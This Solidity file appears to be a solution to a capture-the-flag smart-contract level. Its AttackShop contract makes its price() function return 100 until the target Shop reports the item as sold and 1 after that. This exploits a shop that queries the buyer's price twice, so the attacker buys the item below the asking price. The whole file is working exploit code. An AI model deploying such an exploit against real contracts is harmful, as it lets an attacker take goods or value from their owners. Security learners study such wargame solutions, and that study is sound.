// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function isSold() external view returns(bool);
    function buy() external;
}

contract AttackShop {
    constructor(IShop _shop) public {
        shop = _shop;
    }

    IShop shop;

    uint256 public _price = 100;

    function price() external view returns (uint256) {
        if (IShop(shop).isSold()) {
            return 1;
        }

        return 100;
    }

    function buyItem() external {
        IShop(shop).buy();
    }
}